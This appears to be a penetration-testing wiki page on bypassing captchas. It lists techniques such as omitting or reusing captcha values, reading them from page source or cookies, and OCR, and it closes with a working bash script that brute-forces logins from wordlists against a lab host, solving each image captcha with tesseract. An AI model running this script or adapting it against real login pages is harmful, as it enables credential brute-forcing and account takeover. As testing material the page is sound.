# Captcha Bypass

To **automate** the **testing** of some functions of the server that allows user input it **could** be **needed** to **bypass** a **captcha** implementation. Therefore, try to test for these things:

* **Do not send the parameter** related to the captcha.
  * Change from POST to GET or other HTTP Verbs
  * Change to JSON or from JSON
* Send the **captcha parameter empty**.
* Check if the value of the captcha is **in the source code** of the page.
* Check if the value is **inside a cookie.**
* Try to use an **old captcha value**
* Check if you can use the **same** captcha **value** several times with **the same or different sessionID.**
* If the captcha consists on a **mathematical operation** try to **automate** the **calculation.**
* If the captcha consists of **read characters from an image**, check manually or with code **how many images** are being used and if only a **few images are being used, detect them by MD5.**
* Use an **OCR** ([https://github.com/tesseract-ocr/tesseract](https://github.com/tesseract-ocr/tesseract)).

#### Useful Regex for Scripting bypasses

* [Useful Regex for Scripting bypasses](regular-expression-useful-tips.md)

#### OCR bypass with Tesseract

```bash
#!/bin/bash

USERS="./users.txt"
PASSWORDS="./passwords.txt"

for USER in $(cat $USERS)
do
  for PASS in $(cat $PASSWORDS)
  do
    
    STATUS="Captcha incorreto"
    
    while [ "$STATUS" == "Captcha incorreto" ]
    do

      curl -s "http://192.168.48.133/bruteforce5/captcha.php?l=150&a=50&tf=20&ql=5" -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --output image

      CAPTCHA=$(tesseract image stdout | tr -d " " | xargs)

      STATUS=$(curl -s 'http://192.168.48.133/bruteforce5/index.php' -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --data-raw "username=$USER&password=$PASS&captcha=$CAPTCHA" -L | egrep -o "<p style=\"color:red\" >.*</p>" | sed -r "s/.*>(.*)<.*/\1/g")
        
      if [ "$STATUS" == "" ]
      then    
        COLOR='\033[0;32m'
        NC='\033[0m' # No Color        
        STATUS="Sucesso"
        
      elif [ "$STATUS" == "Captcha incorreto" ]
      then
        COLOR='\033[0;33m'
        NC='\033[0m' # No Color
      else
        COLOR='\033[0;31m'         
      fi
      
      echo -e "${COLOR}User: $USER - Pass: $PASS - Status: $STATUS${NC}"  
    done  
  
  done
done
```
